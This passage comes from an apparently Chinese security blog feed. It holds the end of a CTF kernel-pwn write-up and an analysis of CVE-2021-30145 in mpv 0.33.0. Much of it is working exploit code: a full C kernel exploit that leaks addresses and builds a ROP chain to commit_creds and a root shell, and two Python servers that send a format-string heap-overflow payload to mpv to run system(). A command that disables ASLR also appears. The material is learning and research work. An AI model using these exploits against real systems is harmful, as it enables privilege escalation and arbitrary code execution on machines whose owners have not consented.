class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3))) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc91d0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc8d40</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%rsp, %2;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %3;&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_sp), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] root!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">be_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;pushq %0;&quot;</span></span><br><span class="line"><span class="string">&quot;pushq %1;&quot;</span></span><br><span class="line"><span class="string">&quot;pushq %2;&quot;</span></span><br><span class="line"><span class="string">&quot;pushq %3;&quot;</span></span><br><span class="line"><span class="string">&quot;pushq $shell;&quot;</span></span><br><span class="line"><span class="string">&quot;pushq $0;&quot;</span></span><br><span class="line"><span class="string">&quot;swapgs;&quot;</span></span><br><span class="line"><span class="string">&quot;popq %%rbp;&quot;</span></span><br><span class="line"><span class="string">&quot;iretq;&quot;</span></span><br><span class="line">::<span class="string">&quot;m&quot;</span>(user_ss), <span class="string">&quot;m&quot;</span>(user_sp), <span class="string">&quot;m&quot;</span>(user_rflags), <span class="string">&quot;m&quot;</span>(user_cs)</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> idx;</span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line"><span class="keyword">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ioctl(fd,<span class="number">0x20</span>,&amp;idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">(struct node *nodep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ioctl(fd,<span class="number">0x40</span>,nodep);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ioctl(fd,<span class="number">0x30</span>,&amp;idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">(struct node *nodep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ioctl(fd,<span class="number">0x50</span>,nodep);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x300</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">signal(SIGSEGV, shell);</span><br><span class="line">save_stat();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]open drive\n&quot;</span>);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/kerpwn&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] bad open device\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">node1</span>;</span></span><br><span class="line">node1.buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">node1.len = <span class="number">0x100</span>;</span><br><span class="line">node1.idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(seq_fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] open failed&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show(&amp;node1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Leak address: \n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>/<span class="number">8</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>,*((<span class="keyword">size_t</span> *)node1.buf+i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> base=*((<span class="keyword">size_t</span> *)node1.buf)<span class="number">-0x319d30</span>;</span><br><span class="line"><span class="keyword">size_t</span> offset = base - raw_vmlinux_base;</span><br><span class="line">prepare_kernel_cred=base+prepare_kernel_cred;</span><br><span class="line">commit_creds=base+commit_creds;</span><br><span class="line"><span class="keyword">size_t</span> xchg_eax_esp = <span class="number">0xFFFFFFFF811C4878</span> + offset;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi=<span class="number">0xFFFFFFFF811CAC04</span> + offset;;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdx=<span class="number">0xFFFFFFFF819131BA</span> + offset;</span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax=<span class="number">0xFFFFFFFF815B27CA</span> + offset;</span><br><span class="line"><span class="keyword">size_t</span> swapgs=base+<span class="number">0xc010bc</span>;</span><br><span class="line"><span class="keyword">size_t</span> iretq=base+<span class="number">0x3a2ab</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> start = (xchg_eax_esp &amp; <span class="number">0xfff</span>) / <span class="number">8</span>;</span><br><span class="line"><span class="keyword">size_t</span> *fake_stack = mmap(xchg_eax_esp &amp; <span class="number">0xfffff000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fake_stack != (xchg_eax_esp &amp; <span class="number">0xfffff000</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] mmap failed&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">fake_stack[start + index++] = pop_rdi;</span><br><span class="line">    </span><br><span class="line">fake_stack[start + index++] = <span class="number">0</span>;</span><br><span class="line">fake_stack[start + index++] = prepare_kernel_cred;</span><br><span class="line">fake_stack[start + index++] = pop_rdx;</span><br><span class="line">fake_stack[start + index++] = <span class="number">0</span>;</span><br><span class="line">fake_stack[start + index++] = mov_rdi_rax;</span><br><span class="line">fake_stack[start + index++] = commit_creds;</span><br><span class="line">fake_stack[start + index++] = swapgs;</span><br><span class="line">fake_stack[start + index++] = <span class="number">0</span>;</span><br><span class="line">fake_stack[start + index++] = iretq;</span><br><span class="line">fake_stack[start + index++] = &amp;shell;</span><br><span class="line">fake_stack[start + index++] = user_cs;</span><br><span class="line">fake_stack[start + index++] = user_rflags;</span><br><span class="line">fake_stack[start + index++] = user_sp;</span><br><span class="line">fake_stack[start + index++] = user_ss;</span><br><span class="line">    </span><br><span class="line">*((<span class="keyword">size_t</span> *)node1.buf)=(<span class="keyword">size_t</span>)xchg_eax_esp;</span><br><span class="line">node1.len = <span class="number">0x8</span>;</span><br><span class="line">node1.idx = <span class="number">0</span>;</span><br><span class="line">edit(&amp;node1);</span><br><span class="line">    </span><br><span class="line">read(seq_fd, data, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><em>参考资料：</em></p><p><a href="https://x1ng.top/2020/12/22/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF-%E4%B8%80/">kernel pwn入门之路（一）</a></p><p><a href="https://x1ng.top/2021/11/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF-%E4%B8%89/">kernel pwn入门之路（三）</a></p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/">Kernel ROP - CTF Wiki</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;虽然没参加，但不影响我写writeup :)&lt;/p&gt;
&lt;p&gt;就看了两道比较感兴趣的题，一道是C++的，一道是内核的。并附带了一些小贴士，防止忘记&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://cyyyber.icu/tags/pwn/"/>
    
    <category term="writeup" scheme="http://cyyyber.icu/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-30145分析与复现</title>
    <link href="http://cyyyber.icu/2021/11/08/CVE-2021-30145-mpv/"/>
    <id>http://cyyyber.icu/2021/11/08/CVE-2021-30145-mpv/</id>
    <published>2021-11-07T16:00:00.000Z</published>
    <updated>2021-11-08T02:59:07.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>CVE-2021-30145出现在<a href="https://github.com/mpv-player/mpv/tree/v0.33.0">mpv0.33.0</a>，该漏洞主要是由格式化字符串漏洞引发的堆溢出，从而造成任意代码执行</p><span id="more"></span><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>在demux_mf.c的154行<code>sprintf(fname, filename, count++);</code>，将filename格式化输出到fname中，而filename是可控的。输入参数去掉开头的<code>mf://</code>就是filename</p><p>在这之前还对filename做过校验，需要开头不为<code>@</code>，不含<code>,</code>，且含有<code>%</code>才会执行到这一步</p><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>fname在124行<code>char *fname = talloc_size(mf, strlen(filename) + 32);</code>进行内存分配，分配了filename长度加32的内存空间。由于格式化字符串漏洞的存在，输入到fname中的内容是可以远大于filename的长度的，比如<code>filename=&quot;%100d&quot;</code>，filename的长度为5，而输入到fname中的内容长度为100，这就造成了堆溢出</p><p>另外虽然在Linux系统编译时使用了FORTIFY_SOURCE选项，sprintf被编译成了__sprintf_chk，这个函数有一个参数来表明缓冲区的大小防止缓冲区溢出，并且不能使用<code>%n</code>，但是因为在当前情况下编译器不知道缓冲区的大小，所以这个参数被设置为了<code>0xFFFFFFFFFFFFFFFF</code>，相当于没有做缓冲区溢出的保护。</p><h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><p>在这里内存分配调用的是talloc_size，它将在返回的chunk上方放一个ta_header结构体作为chunk的头部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> size;                <span class="comment">// size of the user allocation</span></span><br><span class="line">    <span class="comment">// Invariant: parent!=NULL =&gt; prev==NULL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">prev</span>;</span>     <span class="comment">// siblings list (by destructor order)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">// Invariant: parent==NULL || parent-&gt;child==this</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">child</span>;</span>    <span class="comment">// points to first child</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">parent</span>;</span>   <span class="comment">// set for _first_ child only, NULL otherwise</span></span><br><span class="line">    <span class="keyword">void</span> (*destructor)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TA_MEMORY_DEBUGGING</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> canary;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">leak_next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">leak_prev</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>值得关注的是，结构体内有一个destructor函数指针，它将在函数ta_free中被调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ta_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">h</span> =</span> get_header(ptr);</span><br><span class="line">    <span class="keyword">if</span> (!h)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (h-&gt;destructor)</span><br><span class="line">        h-&gt;destructor(ptr);</span><br><span class="line">    ta_free_children(ptr);</span><br><span class="line">    ta_set_parent(ptr, <span class="literal">NULL</span>);</span><br><span class="line">    ta_dbg_remove(h);</span><br><span class="line">    <span class="built_in">free</span>(h);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用上面的堆溢出漏洞可以覆盖下一个chunk的头部的destructor指针，从而执行任意函数。同时还需要绕过一些检查，在函数get_header中会调用ta_dbg_check_header函数对chunk的头进行检查，要求<code>canary==0xD3ADB3EF</code>，并且parent为空即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ta_dbg_check_header</span><span class="params">(struct ta_header *h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (h) &#123;</span><br><span class="line">        assert(h-&gt;canary == CANARY);</span><br><span class="line">        <span class="keyword">if</span> (h-&gt;parent) &#123;</span><br><span class="line">            assert(!h-&gt;prev);</span><br><span class="line">            assert(h-&gt;parent-&gt;child == h);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然现在我们可以执行任意函数，但是并不能控制函数的参数。在ta_free中调用了destructor之后又执行了ta_free_children函数，它对child也执行了ta_free函数，如果能伪造一个chunk，将该chunk的地址填入child，就能执行child的destructor，并且child的数据域是可控的，所以就控制了destructor的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ta_free_children</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ta_header</span> *<span class="title">h</span> =</span> get_header(ptr);</span><br><span class="line">    <span class="keyword">while</span> (h &amp;&amp; h-&gt;child)</span><br><span class="line">        ta_free(PTR_FROM_HEADER(h-&gt;child));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>本来想用源码编译，就可以有符号调试，但是搞了一天都没搞好，麻了，就将就用无符号的调试吧</p><p>使用命令<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>关闭ASLR方便调试</p><p>调试比较重要的一个断点就是那个sprintf函数，但是因为没有符号所以不好找，这里我先给__sprintf_chk下断点，然后输入mf://aaaa%d进行调试</p><p><img src="https://z3.ax1x.com/2021/11/07/I3Boh6.png" alt="I3Boh6.png"></p><p>然后就一直c，直到跳到目标__sprintf_chk，然后return就可以得到<code>call __sprintf_chk</code>下一条指令的地址，大概要八十几个c</p><p><img src="https://z3.ax1x.com/2021/11/07/I3BH1O.png" alt="I3BH1O.png"></p><p>因为关了ALSR所以每次的断点只要下在这个地址就行了</p><p><img src="https://z3.ax1x.com/2021/11/07/I3B79K.png" alt="I3B79K.png"></p><p>exp参考<a href="https://devel0pment.de/?p=2217">mpv media player – mf custom protocol vulnerability (CVE-2021-30145)</a>，利用HTTP响应传playload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">7000</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">c, a = s.accept()</span><br><span class="line"></span><br><span class="line">playlist  = <span class="string">b&#x27;mf://&#x27;</span></span><br><span class="line">playlist += <span class="string">b&#x27;%390c%c%c&#x27;</span></span><br><span class="line">playlist += <span class="string">b&#x27;\x58\x1e%4$c\xe4\xff\x7f&#x27;</span> <span class="comment"># overwriting child addr with fake child</span></span><br><span class="line"></span><br><span class="line">SYSTEM_ADDR = <span class="number">0x7ffff5c37410</span></span><br><span class="line">CANARY      = <span class="number">0xD3ADB3EF</span></span><br><span class="line"></span><br><span class="line">fake_chunk  = p64(<span class="number">0</span>) <span class="comment"># size</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment"># prev</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment"># child</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment"># parent</span></span><br><span class="line">fake_chunk += p64(SYSTEM_ADDR) <span class="comment"># destructor</span></span><br><span class="line">fake_chunk += p64(CANARY) <span class="comment"># canary</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment"># leak_next</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment"># leak_prev</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment"># name</span></span><br><span class="line"></span><br><span class="line">d  = <span class="string">b&#x27;HTTP/1.1 200 OK\r\n&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;Content-type: audio/x-mpegurl\r\n&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;Content-Length: &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(playlist)).encode()+<span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;PL: &#x27;</span></span><br><span class="line">d += fake_chunk</span><br><span class="line">d += <span class="string">b&#x27;gnome-calculator\x00&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">d += playlist</span><br><span class="line"></span><br><span class="line">c.send(d)</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure><p>但是不知道为啥我的fname的地址每次都不一样，所以复现不出来</p><p>本来想到另外一种方法，就是直接溢出到数据部分，就不用利用child的free，无奈也验证不了，理论上应该可行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">7000</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">c, a = s.accept()</span><br><span class="line"></span><br><span class="line">playlist  = <span class="string">b&#x27;mf://&#x27;</span></span><br><span class="line">playlist += <span class="string">b&#x27;%1198c%c%c&#x27;</span></span><br><span class="line">playlist += <span class="string">b&#x27;%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c&#x27;</span> <span class="comment">#parent</span></span><br><span class="line">playlist += <span class="string">b&#x27;\x10\xd4\x01\xf4\xff\x7f%4$c%4$c&#x27;</span><span class="comment">#p64(0x7ffff401d410) #destructor=system</span></span><br><span class="line">playlist += <span class="string">b&#x27;\xef\xb3\xad\xd3%4$c%4$c%4$c%4$c&#x27;</span><span class="comment">#p64(0xD3ADB3EF) #canary</span></span><br><span class="line">playlist += <span class="string">b&#x27;%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c&#x27;</span> <span class="comment">#leak_next</span></span><br><span class="line">playlist += <span class="string">b&#x27;%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c&#x27;</span> <span class="comment">#leak_prev</span></span><br><span class="line">playlist += <span class="string">b&#x27;%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c&#x27;</span> <span class="comment">#name</span></span><br><span class="line">playlist += <span class="string">b&#x27;gnome-calculator%4$c&#x27;</span></span><br><span class="line"></span><br><span class="line">d  = <span class="string">b&#x27;HTTP/1.1 200 OK\r\n&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;Content-type: audio/x-mpegurl\r\n&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;Content-Length: &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(playlist)).encode()+<span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">d += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">d += playlist</span><br><span class="line"></span><br><span class="line">c.send(d)</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞点分析&quot;&gt;&lt;a href=&quot;#漏洞点分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞点分析&quot;&gt;&lt;/a&gt;漏洞点分析&lt;/h1&gt;&lt;p&gt;CVE-2021-30145出现在&lt;a href=&quot;https://github.com/mpv-player/mpv/tree/v0.33.0&quot;&gt;mpv0.33.0&lt;/a&gt;，该漏洞主要是由格式化字符串漏洞引发的堆溢出，从而造成任意代码执行&lt;/p&gt;</summary>
    
    
    
    
    <category term="CVE" scheme="http://cyyyber.icu/tags/CVE/"/>
    
    <category term="漏洞分析" scheme="http://cyyyber.icu/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>glibc(2.26) free原理及源码分析</title>
